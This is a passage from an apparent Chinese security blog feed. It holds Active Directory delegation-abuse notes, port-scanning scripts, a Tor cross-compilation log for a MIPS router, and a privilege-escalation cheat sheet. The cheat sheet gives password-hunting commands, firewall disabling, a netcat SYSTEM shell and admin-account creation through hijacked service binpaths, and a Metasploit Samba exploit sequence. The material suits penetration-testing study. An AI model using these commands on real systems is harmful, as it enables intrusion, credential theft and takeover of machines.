src="/2018/01/13/利用域委派获取域某些权限/cfis2.png" alt="cfis2"></p><pre><code>dir \\owa2010dc.demo.local\c$ ==&gt; ok</code></pre><p>(4个小时后TGT失效，需要重新认证。)</p><p><a href="https://www.anquanke.com/post/id/92484" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92484</a> 示例有四個，他演示的是示例1，這裏演示的是示例4</p><pre><code>样例1：已知被设置约束性委派属性的服务账号的口令明文，则可以获取域管理权限样例2：已控制约束性委派服务账号所在的服务器    攻击者控制了服务器，与样例1类似。由于攻击者控制了服务器，可直接利用mimikatz从内存获取服务账号的TGT，所以可以省去tgt::ask步骤，直接从tgs:s4u步骤开始，后续和样例1相同。样例3：已获取配置了约束性委派的服务账号的口令NTLM    和样例1相同，样例1用明文口令生成NTLM，然后向域服务器申请获取服务账号的TGT。Kekeo提供了该功能，可直接从NTLM开始，向域服务器申请TGT。样例4：一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM    方法和样例1也是类似，只不过样例1中是服务账号，而本样例中是主机账号。测试结果截图分别如下，不再过多解释。测试可在任何域内主机中进行，不需要在主机账号所在的主机。</code></pre><p>參考：</p><pre><code>https://www.anquanke.com/post/id/92484  (作者筆誤： &quot;由于sqlsvc被设置为非约束性委派&quot; 改成 &quot;由于sqlsvc被设置为约束性委派&quot; 已證明 )http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/http://powersploit.readthedocs.io/en/latest/https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-域委派&quot;&gt;&lt;a href=&quot;#0x01-域委派&quot; class=&quot;headerlink&quot; title=&quot;0x01 域委派&quot;&gt;&lt;/a&gt;0x01 域委派&lt;/h2&gt;
    
    </summary>
    
      <category term="技术相关" scheme="https://sp4rr0w.github.io/categories/%E6%8A%80%E6%9C%AF%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="PowerShell" scheme="https://sp4rr0w.github.io/tags/PowerShell/"/>
    
      <category term="域委派" scheme="https://sp4rr0w.github.io/tags/%E5%9F%9F%E5%A7%94%E6%B4%BE/"/>
    
      <category term="TGS票据" scheme="https://sp4rr0w.github.io/tags/TGS%E7%A5%A8%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>域渗透(提权篇)</title>
    <link href="https://sp4rr0w.github.io/2018/01/09/%E5%9F%9F%E6%B8%97%E9%80%8F(%E6%8F%90%E6%9D%83%E7%AF%87)/"/>
    <id>https://sp4rr0w.github.io/2018/01/09/域渗透(提权篇)/</id>
    <published>2018-01-09T20:20:00.000Z</published>
    <updated>2018-03-28T01:36:17.679Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-常见信息收集"><a href="#0x01-常见信息收集" class="headerlink" title="0x01 常见信息收集"></a>0x01 常见信息收集</h2><a id="more"></a><pre><code>dir /a-r-d /s /b                                 检查文件夹可写状态dir /b/s password.txt                            查找密码文件或其它敏感文件dir /b/s config.*findstr /si password *.xml *.ini *.txt findstr /si login *.xml *.ini *.txt C:\sysprep.infC:\sysprep\sysprep.xmlC:\Windows\Panther\Unattend\Unattended.xmlC:\Windows\Panther\Unattended.xmldir /s *pass* == *cred* == *vnc* == *.config*    搜索system32关键字的文件findstr /si password *.xml *.ini *.txt           搜索某些特定的文件类型reg query HKLM /f password /t REG_SZ /s          搜索注册表中包含passwordreg query HKCU /f password /t REG_SZ /snetsh firewall show config                       显示 Windows 防火墙配置netsh firewall show state                        显示 Windows 防火墙的当前状态 netsh firewall set opmode disable                关闭防火墙netsh advfilewall set publicprofile state offsysteminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;    获取操作系统信息systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;         schtasks /query /fo LIST /v                      计划任务 [国外调整 chcp 437]route print                                      查看路由表arp -A                                           查看ARP缓存</code></pre><h2 id="0x02-upnphost提权"><a href="#0x02-upnphost提权" class="headerlink" title="0x02 upnphost提权"></a>0x02 upnphost提权</h2><pre><code>sc qc Spooler                 查询，配置，和管理Windows服务accesschk.exe -ucqv Spooler   检查每个服务需要的权限   XP_SP2被修复攻击手法：    sc qc upnphost    sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e    C:\WINDOWS\System32\cmd.exe&quot;    sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;    sc qc upnphost    net start upnphost    执行netcat并且使用SYSTEM权限反弹一个shell    sc config PFNET binpath= &quot;net user admin P@ssword123! /add&quot;    sc stop PFNET    sc start PFNET    sc config PFNET binpath= &quot;net localgroup Administrators admin /add&quot;    sc stop PFNET    sc start PFNET</code></pre><h2 id="0x03-服务与权限"><a href="#0x03-服务与权限" class="headerlink" title="0x03 服务与权限"></a>0x03 服务与权限</h2><pre><code>DRIVERQUERY                 安装驱动wmic product list brief     查看安装程序和版本信息. [可能存在漏洞]wmic service list brief     查看服务、进程和启动程序信息wmic process list briefwmic startup list briefwmic qfe get Caption,Description,HotFixID,InstalledOn   查看安装补丁和时间信息wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KBxxxxxxx&quot;wimc process where(description=&quot;进程名&quot;)       结合tasklist /svc wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;    列出目标机器上所有没有用引号包含的服务路径tasklist /v /fo list /fi &quot;USERNAME eq NT AUTHORITY\SYSTEM&quot;  筛选NT AUTHORITY\SYSTEM权限进程icacls &quot;C:\Program Files (x86)\360&quot;     查看路径中受影响文件夹的权限</code></pre><h2 id="0x04-补丁对应Exp"><a href="#0x04-补丁对应Exp" class="headerlink" title="0x04 补丁对应Exp"></a>0x04 补丁对应Exp</h2><p>补丁对比 <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p><pre><code>pip install xlrd --upgrade./windows-exploit-suggester.py --update[+] writing to file 2014-06-06-mssb.xlsx 输入“systeminfo”输入，并将其指向微软数据库./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo     win7sp1-systeminfo.txt 未修补漏洞存在的exp./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext     &#39;windows server 2008 r2&#39;</code></pre><h2 id="0x05-AlwaysInstallElevated提权"><a href="#0x05-AlwaysInstallElevated提权" class="headerlink" title="0x05 AlwaysInstallElevated提权"></a>0x05 AlwaysInstallElevated提权</h2><pre><code>http://www.greyhathacker.net/?p=185如果这个设置被启用，它允许任何权限的用户暂时使用NT AUTHORITY\SYSTEM权限来安装*.msi文件。AlwaysInstallElevated且它的DWORD值是1才有效。https://github.com/SecWiki/windows-kernel-exploitshttps://github.com/SecWiki/linux-kernel-exploits可以利用Advanced Installer(http://www.advancedinstaller.com/)生成msi安装包</code></pre><h2 id="0x06-查看-msi程序的执行权限"><a href="#0x06-查看-msi程序的执行权限" class="headerlink" title="0x06 查看.msi程序的执行权限"></a>0x06 查看.msi程序的执行权限</h2><pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedreg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre><h2 id="0x07-查看是否设置有setuid和setgid"><a href="#0x07-查看是否设置有setuid和setgid" class="headerlink" title="0x07 查看是否设置有setuid和setgid"></a>0x07 查看是否设置有setuid和setgid</h2><pre><code>reg query HKEY_Local_Machine\System\CurrentControlSet\Services\NfsSvr\Parameters\SafeSetUidGidBitsCVE-2017-1000367    系统必须启用selinux    sudo需要用selinux支持（sudo -r）    用户需要具有sudo权限gcc -o sudopwn sudopwn.c -lutil./sudopwn</code></pre><p>枚举系统设置和权限的检查<br><a href="http://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="noopener">http://www.securitysift.com/download/linuxprivchecker.py</a></p><h2 id="0x08-基于操作系统的内核版本号"><a href="#0x08-基于操作系统的内核版本号" class="headerlink" title="0x08 基于操作系统的内核版本号"></a>0x08 基于操作系统的内核版本号</h2><pre><code>https://github.com/PenturaLabs/Linux_Exploit_Suggester./Linux_Exploit_Suggester.pl -k 内核版本号[例如3.10,结合uname -a]</code></pre><h2 id="0x09-检测权限提升向量的shell脚本"><a href="#0x09-检测权限提升向量的shell脚本" class="headerlink" title="0x09 检测权限提升向量的shell脚本"></a>0x09 检测权限提升向量的shell脚本</h2><pre><code>https://github.com/pentestmonkey/unix-privesc-checkunix-privesc-check standardunix-privesc-check detailed</code></pre><p>下载和解压缩脚本RootHelper<br><a href="https://github.com/NullArray/RootHelper" target="_blank" rel="noopener">https://github.com/NullArray/RootHelper</a></p><h2 id="0x10-CVE-2017-7494-Samba"><a href="#0x10-CVE-2017-7494-Samba" class="headerlink" title="0x10 CVE-2017-7494[Samba]"></a>0x10 CVE-2017-7494[Samba]</h2><pre><code>http://fuping.site/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/use exploit/linux/samba/is_known_pipenameset RHOST 192.168.232.137set target 3exploit</code></pre><h2 id="0x11-内核提权"><a href="#0x11-内核提权" class="headerlink" title="0x11 内核提权"></a>0x11 内核提权</h2><pre><code>lsb_release -auname -apython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;suid 提权 [有限制]find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p>from:<br><a href="https://04z.net/2017/07/10/AD-Attacks-go/" target="_blank" rel="noopener">https://04z.net/2017/07/10/AD-Attacks-go/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-常见信息收集&quot;&gt;&lt;a href=&quot;#0x01-常见信息收集&quot; class=&quot;headerlink&quot; title=&quot;0x01 常见信息收集&quot;&gt;&lt;/a&gt;0x01 常见信息收集&lt;/h2&gt;
    
    </summary>
    
      <category term="技术相关" scheme="https://sp4rr0w.github.io/categories/%E6%8A%80%E6%9C%AF%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="笔记" scheme="https://sp4rr0w.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="域渗透" scheme="https://sp4rr0w.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>批量测试端口开放</title>
    <link href="https://sp4rr0w.github.io/2017/12/09/%E6%89%B9%E9%87%8F%E6%B5%8B%E8%AF%95%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE/"/>
    <id>https://sp4rr0w.github.io/2017/12/09/批量测试端口开放/</id>
    <published>2017-12-09T23:23:00.000Z</published>
    <updated>2018-03-28T01:34:04.019Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-PowerShell简单测试端口开放"><a href="#0x01-PowerShell简单测试端口开放" class="headerlink" title="0x01. PowerShell简单测试端口开放"></a>0x01. PowerShell简单测试端口开放</h2><a id="more"></a><pre><code>import-Module .\Invoke-TestPortInvoke-TestPort -ipLists C:\x.txt 23function Invoke-TestPort{    [CmdletBinding()] Param (        [Parameter(Mandatory = $true, Position = 0)]        [Alias(&quot;Url&quot;,&quot;Domain&quot;)]        [String]        $ipLists,        [Parameter(Mandatory = $true ,Position = 1)]        [String]        $Port    )    Process{       Write-Host &quot;Starting TestPort ...&quot;       $ips = Get-Content -ErrorAction SilentlyContinue -Path $ipLists       foreach ($ip in $ips){           try{               $socket = new-object System.Net.Sockets.TcpClient($ip, $Port)           }           catch [Exception]{               Write-Host $ip&quot;:&quot;$Port &quot;CAN&#39;T Connected&quot;               continue           }           Write-Host $ip&quot;:&quot;$Port &quot;CAN Connected&quot;        }    }}</code></pre><p>0x02. Python批量测试Telnet端口开放</p><pre><code>import sysimport getpassimport pexpectimport telnetlibimport threadpoolOKWHITE = &#39;\033[1;37m&#39;OKENDC = &#39;\033[0m&#39;class Telnets_OK():    def __init__(self,ip,thread_id,Store_Result_txt):        self.ip                      = ip        self.thread_id               = thread_id        self.Store_Result_txt        = Store_Result_txt        self.OKWHITE = &#39;\033[1;37m&#39;         self.OKGREEN = &#39;\033[92m&#39;        self.OKWARNING = &#39;\033[93m&#39;         self.OKFAIL = &#39;\033[91m&#39;            self.OKENDC = &#39;\033[0m&#39;        self.login()    def Store_ok_txt(self):        with open(&#39;Can_Telnet_{0}&#39;.format(self.Store_Result_txt),&#39;a+&#39;) as f:            f.write(self.ip + &quot;^&quot;)            f.write(&quot;\n&quot;)    def Store_not_ok_txt(self):        with open(&#39;Cannot_Telnet_{0}&#39;.format(self.Store_Result_txt),&#39;a+&#39;) as f:            f.write(self.ip + &quot;^&quot;)            f.write(&quot;\n&quot;)    def login( self ):        cmd = &#39;telnet &#39; + self.ip         child = pexpect.spawn(cmd)        index = child.expect([&quot;[lL]ogin&quot;, &quot;(?i)Unknown host&quot;, pexpect.EOF, pexpect.TIMEOUT])        if ( index == 0 ):            print self.OKGREEN +   &quot;[+] can   telnet : {0}&quot;.format(self.ip) + self.OKENDC            self.Store_ok_txt()        else:              print self.OKFAIL + &quot;[-] can\&#39;t telnet : {0}&quot;.format(self.ip) + self.OKENDC            self.Store_not_ok_txt()        child.close()  def Load_Urls_Txt( txt):    Urls_Pass   = []    f           = open( txt, &#39;r&#39;)    line        = f.readline().strip(&#39;\n&#39;)    while (line):        Urls_Pass.append(line)        line    = f.readline().strip(&#39;\n&#39;)    f.close()    return Urls_Passdef main(Urls_Pass ,Store_Result_txt):    task_pool = threadpool.ThreadPool(20)    templists = []    for i in range(0,len(Urls_Pass)):        a       = Urls_Pass[0]        temp    = a.split(&#39;^&#39;)        udic    = {}        udic[&#39;ip&#39;]      = temp[0]         udic[&#39;Store_Result_txt&#39;]= Store_Result_txt        udic[&#39;thread_id&#39;]   = i        tmp = (None,udic)        Urls_Pass.remove(a)        templists.append(tmp)    request_list = threadpool.makeRequests(Telnets_OK , templists)    map(task_pool.putRequest , request_list)    task_pool.wait()if __name__ == &#39;__main__&#39;:    if len(sys.argv) != 2:        print OKWHITE        print &#39;Usage      : python {0} &lt;txt&gt;&#39;.format(sys.argv[0])         print &#39;txt        : domain or ip&#39;        print &#39;Threads    : 20 (default)&#39;        print &#39;Name       : piliang telnet&#39;        print OKENDC        sys.exit(1)    print OKWHITE + &quot;Loading : {0}&quot;.format(sys.argv[1])     txt             = &#39;&#39;.join(sys.argv[1])    Urls_Pass    = Load_Urls_Txt(txt)    print &quot;Lines : {0}&quot;.format(len(Urls_Pass)) + OKENDC    main(Urls_Pass, sys.argv[1])</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-PowerShell简单测试端口开放&quot;&gt;&lt;a href=&quot;#0x01-PowerShell简单测试端口开放&quot; class=&quot;headerlink&quot; title=&quot;0x01. PowerShell简单测试端口开放&quot;&gt;&lt;/a&gt;0x01. PowerShell简单测试端口开放&lt;/h2&gt;
    
    </summary>
    
      <category term="技术相关" scheme="https://sp4rr0w.github.io/categories/%E6%8A%80%E6%9C%AF%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="PowerShell" scheme="https://sp4rr0w.github.io/tags/PowerShell/"/>
    
      <category term="Python" scheme="https://sp4rr0w.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>交叉编译tor在路由器上使用</title>
    <link href="https://sp4rr0w.github.io/2017/12/07/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91tor%E5%9C%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%8A%E4%BD%BF%E7%94%A8/"/>
    <id>https://sp4rr0w.github.io/2017/12/07/交叉编译tor在路由器上使用/</id>
    <published>2017-12-07T15:23:00.000Z</published>
    <updated>2018-03-28T02:17:46.404Z</updated>
    
    <content type="html"><![CDATA[<p>Router Model : RT-AC66U<br>Router CPU : MIPS32<br><a id="more"></a></p><h2 id="正常编译tor"><a href="#正常编译tor" class="headerlink" title="正常编译tor"></a>正常编译tor</h2><p>在 <code>Ubuntu</code> 下</p><pre><code>sudo apt-get install opensslsudo apt-get install libevent-devsudo apt-get install build-essentialsudo apt-get install libssl-devtar xzf tor-0.3.1.8.tar.gzcd tor-0.3.1.8./configure &amp;&amp; makesrc/or/torsrc/config/torrc   # torrc src/or/tor -f src/config/torrc &amp;</code></pre><p>直接交叉编译tor 是有问题的<br>结合上篇文章编译buildroot生成的buildroot-2011.05下/output/ 相关编译文件:</p><pre><code>$ cd tor $ ./configure : $ CC=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc RANLIB=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ranlib AR=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ar LD=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ld STRIP=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-strip ./configure --host=mipsel-linux --disable-tool-name-check --enable-static-libevent --with-libevent-dir=/usr/local/lib</code></pre><!-- more --><p>即:</p><pre><code>$ CC=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc \RANLIB=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ranlib \AR=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ar \LD=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ld \STRIP=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-strip \./configure --host=mipsel-linux --disable-tool-name-check \--enable-static-libevent \--with-libevent-dir=/usr/local/libor --with-libevent-dir=/usr/lib64/</code></pre><p>出错</p><pre><code>checking for libevent directory... configure: WARNING: Could not find a linkable libevent.If you have it installed somewhere unusual, you can specify an explicit path using --with-libevent-dirconfigure: WARNING: On most Redhat-based systems, you can get libevent by installing the libevent RPM packageconfigure: WARNING:    You will probably need to install libevent-devel too.configure: error: Missing libraries; unable to proceed.</code></pre><p>装了libevent-devel 依旧如是</p><p>拷贝 bin/ 下的<code>mipsel-linux-*</code> 到 <code>ubuntu</code></p><pre><code>$ CC=/home/db/Desktop/usr/bin/mipsel-linux-gcc RANLIB=/home/db/Desktop/usr/bin/mipsel-linux-ranlib AR=/home/db/Desktop/usr/bin/mipsel-linux-ar LD=/home/db/Desktop/usr/bin/mipsel-linux-ld STRIP=/home/db/Desktop/usr/bin/mipsel-linux-strip ./configure --host=mipsel-linux --disable-tool-name-check --enable-static-libevent --with-libevent-dir=/home/db/Desktop/libevent-1.4.12-stable/</code></pre><p>即:</p><pre><code>$ CC=/home/db/Desktop/usr/bin/mipsel-linux-gcc \RANLIB=/home/db/Desktop/usr/bin/mipsel-linux-ranlib \AR=/home/db/Desktop/usr/bin/mipsel-linux-ar \LD=/home/db/Desktop/usr/bin/mipsel-linux-ld \STRIP=/home/db/Desktop/usr/bin/mipsel-linux-strip \./configure --host=mipsel-linux \--disable-tool-name-check --enable-static-libevent \--with-libevent-dir=/home/db/Desktop/libevent-1.4.12-stable/or --with-libevent-dir=/usr/lib/x86_64-linux-gnu/--with-libevent-dir=/lib/x86_64-linux-gnu/</code></pre><p>也是不行滴</p><p>ubuntu 直接编译 tor 后 拷贝<code>tor(10M)</code> 到 <code>centos</code>上使用,转移各种库依旧是不行滴。 </p><pre><code>$./tor: error while loading shared libraries: libssl.so.1.0.0: cannot open shared object file: No such file or directory===&gt; $ copy /lib/x86_64-linux-gnu/libssl.so.1.0.0         (ubuntu)  =&gt; desktop (centos )$ copy /lib/x86_64-linux-gnu/libcrypto.so.1.0.0     (ubuntu)  =&gt; desktop (centos )$ mv libssl.so.1.0.0 /usr/lib64/            (centos )$ mv libcrypto.so.1.0.0 /usr/lib64/        (centos )</code></pre><p>$ ./tor –help</p><pre><code>./tor: /lib64/libc.so.6: version &#39;GLIBC_2.14&#39; not found (required by ./tor)./tor: /lib64/libc.so.6: version &#39;GLIBC_2.17&#39; not found (required by ./tor)./tor: /lib64/libc.so.6: version &#39;GLIBC_2.14&#39; not found (required by /usr/lib64/libssl.so.1.0.0)./tor: /lib64/libc.so.6: version &#39;GLIBC_2.14&#39; not found (required by /usr/lib64/libcrypto.so.1.0.0)$ ls -al /lib/x86_64-linux-gnu/libc.so.6     (ubuntu)    lrwxrwxrwx 1 root root 12 Jun 16 16:57 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.23.so$ copy /lib/x86_64-linux-gnu/libc-2.23.so        (ubuntu)  =&gt; desktop (centos )$ mv libc-2.23.so /lib64/libc-2.23.so         (centos )    ln: creating symbolic link &#39;/lib64/libc.so.6&#39;: File exists$ mv /lib64/libc.so.6 /lib64/libc.so.6-copy$ ln -s /lib64/libc-2.23.so /lib64/libc.so.6error error !!!!!!!!!!!!!!!!!!!!!!!!!!!!!$ ls -al #命令都使用不了了ls: error while loading shared libraries: libc.so.6: cannot open shared object file: No such file or directory$ mvmv: error while loading shared libraries: libc.so.6: cannot open shared object file: No such file or directory</code></pre><p>看了网上,tor交叉编译时需要的库,也需要交叉编译的 : </p><p>Centos<br>/root/Desktop/1/ : </p><pre><code>openssl-1.1.0ghttps://www.openssl.org/source/openssl-1.1.0g.tar.gzlibevent-2.1.8-stable.tar.gzhttps://github.com/libevent/libevent/releases/download/release-2.1.8-stable/libevent-2.1.8-stable.tar.gzzlib-1.2.11https://zlib.net/zlib-1.2.11.tar.gz</code></pre><p><code>----------------------------------------------------------------------</code></p><h2 id="交叉编译-openssl"><a href="#交叉编译-openssl" class="headerlink" title="交叉编译 openssl"></a>交叉编译 openssl</h2><pre><code>$ CC=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc AR=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ar RANLIB=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ranlib LD=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ld STRIP=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-strip ./config --prefix=/root/Desktop/cross/yes/openssl </code></pre><p>即:</p><pre><code>$ CC=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-gcc \AR=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ar \RANLIB=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux-ranlib \./config \--prefix=/root/Desktop/cross/yes/openssl </code></pre><p>$ make 出错 </p><pre><code>crypto/aes/aes-x86_64.s:1743: Error: unrecognized opcode &#39;leaq 48(%rsi),%rsp&#39;crypto/aes/aes-x86_64.s:1745: Error: unrecognized opcode &#39;popfq&#39;crypto/aes/aes-x86_64.s:1749: Error: Alignment too large: 28. assumed.crypto/aes/aes-x86_64.s:2139: Error: Alignment too large: 28. assumed.crypto/aes/aes-x86_64.s:2534: Error: Alignment too large: 28. assumed.make[1]: *** [crypto/aes/aes-x86_64.o] Error 1make[1]: Leaving directory &#39;/root/Desktop/cross/1/openssl-1.1.0g&#39;make: *** [all] Error 2</code></pre><p>使用 <code>--cross-compile-prefix</code> :</p><pre><code>$ CC=gcc RANLIB=ranlib AR=ar ./config --prefix=/root/Desktop/cross/yes/openssl/ --cross-compile-prefix=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux- linux-mips32</code></pre><p>即:</p><pre><code>$ CC=gcc \RANLIB=ranlib \AR=ar \./config \--prefix=/root/Desktop/cross/yes/openssl/ \--cross-compile-prefix=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux- \linux-mips32</code></pre><p>编译成功是因为<code>Makefile</code>根本没起作用,上面那些参数根本没填入到Makefile里面</p><p><code>https://github.com/openssl/openssl/blob/master/INSTALL</code><br>官方文档说使用<code>--cross-compile-prefix</code>时,必须用<code>./Configure</code>,而不是./config<br>==&gt;</p><pre><code>$ CC=gcc RANLIB=ranlib AR=ar ./Configure --prefix=/root/Desktop/cross/yes/openssl/ --cross-compile-prefix=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux- linux-mips32</code></pre><p>即:</p><pre><code>$ CC=gcc \RANLIB=ranlib \AR=ar \./Configure \    ####./config 改成 ./Configure--prefix=/root/Desktop/cross/yes/openssl/ \--cross-compile-prefix=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin/mipsel-linux- \linux-mips32or os/compiler:linux-mips32</code></pre><p>$ make 出错</p><pre><code>/root/Desktop/8/buildroot-2011.05/output/host/usr/mipsel-unknown-linux-uclibc/sysroot/usr/include/features.h:216:5: \error: #error It appears you have defined _FILE_OFFSET_BITS=64. Unfortunately, uClibc was built without large file support enabled.In file included from /root/Desktop/8/buildroot-2011.05/output/host/usr/mipsel-unknown-linux-uclibc/sysroot/usr/include/stdio.h:72,                         from crypto/bio/bss_file.c:37:/root/Desktop/8/buildroot-2011.05/output/host/usr/mipsel-unknown-linux-uclibc/sysroot/usr/include/bits/uClibc_stdio.h:61:2: \error: #error Sorry... uClibc was built without large file support!</code></pre><p>发现 ===&gt; <code>https://bjglife.blogspot.nl/2015/01/linux-porting-openssl-to-mips-platform.html</code><br>===&gt; 文章里面选择了这个 <code>Enable large file (files &gt; 2 GB) support</code> 想必和错误有关</p><p>之前编译buildroot:<br>    choose:</p><pre><code>Target Architecture (MIPS (little endian))  ---&gt;Target Architecture Variant (mips 32)  ---&gt;</code></pre><p>生成 =&gt; /root/Desktop/8/buildroot-2011.05/output/host/usr/bin<br>现在编译buildroot:<br>    choose:</p><pre><code>Target Architecture (MIPS (little endian))  ---&gt;Target Architecture Variant (mips 32)  ---&gt;Toolchain type (Buildroot toolchain)  ---&gt; [*] Enable large file (files &gt; 2 GB) support</code></pre><p>生成 =&gt; /root/Desktop/88/buildroot-2011.05/output/host/usr/bin </p><p>变量</p><pre><code>$ export MIPSEL_LINUX_PATH=/root/Desktop/8/buildroot-2011.05/output/host/usr/bin    ##### unset MIPSEL_LINUX_PATH$ export MIPSEL_LINUX_PATH2=/root/Desktop/88/buildroot-2011.05/output/host/usr/bin    ##### unset MIPSEL_LINUX_PATH2</code></pre><p>再次交叉编译 :</p><pre><code>$ ./Configure no-async --prefix=/root/Desktop/cross/yes/openssl2 --cross-compile-prefix=$MIPSEL_LINUX_PATH2/mipsel-linux- linux-mips32</code></pre><p>找错 <code>https://github.com/openssl/openssl/issues/1607</code>  ==&gt; add <code>no-async</code>  # 不加否则错误<br>$ make<br>$ make install<br>ok =&gt; /root/Desktop/cross/yes/openssl2</p><p>到openssl2下面执行/root/Desktop/cross/yes/openssl2/lib<br>$ file libssl.so.1.1</p><pre><code>libssl.so.1.1: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped</code></pre><p>ok编译成功</p><p>对了 这边需要很强调一点是 编译哪个版本的buildroot,即使编译buildroot时多选了几个选项,都需要根据Buildroot编译后的bin/下面的文件，进行对<code>openssl</code>再次交叉编译，不然出现 <code>You will probably need to install openssl-devel too.</code></p><hr><h2 id="交叉编译-libevent"><a href="#交叉编译-libevent" class="headerlink" title="交叉编译 libevent"></a>交叉编译 libevent</h2><pre><code>$ ./configure --prefix=/root/Desktop/cross/yes/libevent CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip --host=mipsel-linux </code></pre><p>错误 </p><pre><code>bufferevent_openssl.c:66:10: fatal error: &#39;openssl/bio.h&#39; file not found</code></pre><p>找错 <code>https://github.com/libevent/libevent/issues/465</code><br>需要配合 <code>openssl</code> 加上 <code>CPPFLAGS</code> and <code>LDFLAGS</code></p><p>再次交叉编译 </p><pre><code>$ ./configure --prefix=/root/Desktop/cross/yes/libevent CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip --host=mipsel-linux CPPFLAGS=-I/root/Desktop/cross/yes/openssl2/include LDFLAGS=-L/root/Desktop/cross/yes/openssl2/lib</code></pre><p>即:</p><pre><code>$ ./configure --prefix=/root/Desktop/cross/yes/libevent \CC=$MIPSEL_LINUX_PATH2/mipsel-linux-gcc \AR=$MIPSEL_LINUX_PATH2/mipsel-linux-ar \RANLIB=$MIPSEL_LINUX_PATH2/mipsel-linux-ranlib \LD=$MIPSEL_LINUX_PATH2/mipsel-linux-ld \STRIP=$MIPSEL_LINUX_PATH2/mipsel-linux-strip \--host=mipsel-linux \CPPFLAGS=-I/root/Desktop/cross/yes/openssl2/include \LDFLAGS=-L/root/Desktop/cross/yes/openssl2/lib</code></pre><p>警告 </p><pre><code>/root/Desktop/cross/yes/openssl2/lib/libcrypto.so: warning: gethostbyname is obsolescent, use getnameinfo() instead.</code></pre><p>$ make<br>$ make install<br>ok=&gt; /root/Desktop/cross/yes/openssl2</p><p>到libevent下面执行/root/Desktop/cross/yes/libevent/lib<br>$ file libevent-2.1.so.6.0.2</p><pre><code>libevent-2.1.so.6.0.2: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x3040000, not stripped</code></pre><p><code>编译成功</code></p><h2 